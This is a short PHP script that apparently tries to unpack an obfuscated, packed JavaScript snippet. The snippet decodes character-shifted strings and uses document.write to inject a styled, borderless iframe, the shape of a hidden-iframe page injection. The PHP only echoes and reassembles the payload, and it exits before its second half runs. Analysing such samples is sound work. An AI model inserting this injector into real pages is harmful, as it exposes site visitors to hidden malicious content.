

<?php
    
    
    
    
    
 
 

$z = ' 
 eval(function(p,a,c,k,e,d){e=function(c){return c};if(!\'\'.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return\'\w+\'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp(\'\b\'+e(c)+\'\b\',\'g\'),k[c])}}return p}(\'10 6,3,1;11 9(3){7="";17(4=0;4<3.20;4++){1=3.25(4);8(1<19){1=1-18;8(1<32){1=22+(1-32)}}7+=24.23(1)}15 7}6="!12\"16~13\\\\\\14\';21,\'>43\"26\"42\\5\"41\\40\\5\"39\\5\"44^46\"47~245~3837~230~229~228~2\\27~3133~36#"; \',10,48,\'|n|t|s|i|KZQQXHWJJS|a|r|if|fb253b780bb71b541a8b0d0799c03f893|var|function|NKWFRJdXWH|ss|rTUJSQTFIrHTsJRGJIsXWV_|return|fMYYUX|for|68|128|length|NX|127|fromCharCode|String|charCodeAt|fSTfKWFRJGTWIJW|NIYM|GTYYTR|WNLMY|QJKY|utti||MJNLMY|write|document|uttif|YTU|FGXTQZYJ|fYWZJfRT_FQQT|JGPNYFQQT|fYWZJf|ftfFQQT|sfXHWTQQNSL|fYWZJfXY|UTXNYNTS|QJ|fGTWIJW\'.split(\'|\'),0,{}))   ';



$z = preg_replace("#^[\d\D]+{[\d\D]+}#" , "" , $z ) ;

echo $z ;
exit;





    $a = '10 6,3,1;11 9(3){7="";17(4=0;4<3.20;4++){1=3.25(4);8(1<19){1=1-18;8(1<32){1=22+(1-32)}}7+=24.23(1)}15 7}6="!12\\"16~13\\\\\\\\\\\\14\';21,\'>43\\"26\\"42\\\\5\\"41\\\\40\\\\5\\"39\\\\5\\"44^46\\"47~245~3837~230~229~228~2\\\\27~3133~36#";35.34(9(6));';
    $b =  '|n|t|s|i|KZQQXHWJJS|a|r|if|fb253b780bb71b541a8b0d0799c03f893|var|function|NKWFRJdXWH|ss|rTUJSQTFIrHTsJRGJIsXWV_|return|fMYYUX|for|68|128|length|NX|127|fromCharCode|String|charCodeAt|fSTfKWFRJGTWIJW|NIYM|GTYYTR|WNLMY|QJKY|utti||MJNLMY|write|document|uttif|YTU|FGXTQZYJ|fYWZJfRT_FQQT|JGPNYFQQT|fYWZJf|ftfFQQT|sfXHWTQQNSL|fYWZJfXY|UTXNYNTS|QJ|fGTWIJW';     
       
    $c = explode("|" , $b ) ;
          
    //print_r($c);
    
    $a = preg_match_all( "#(\d+)\D+#" ,    $a , $m  ) ;   
   
    print_r($m[0]);
    
    $str = '' ;
    foreach($m[0] as $key => $val )
    {
        $i = preg_replace("#\D#" , "" , $val ) ;
        
        $str .= str_replace( $i , $c[$i] , $val  ) ;
        
    }
    
echo $str ;
 
    
    ?>
    
   
  
 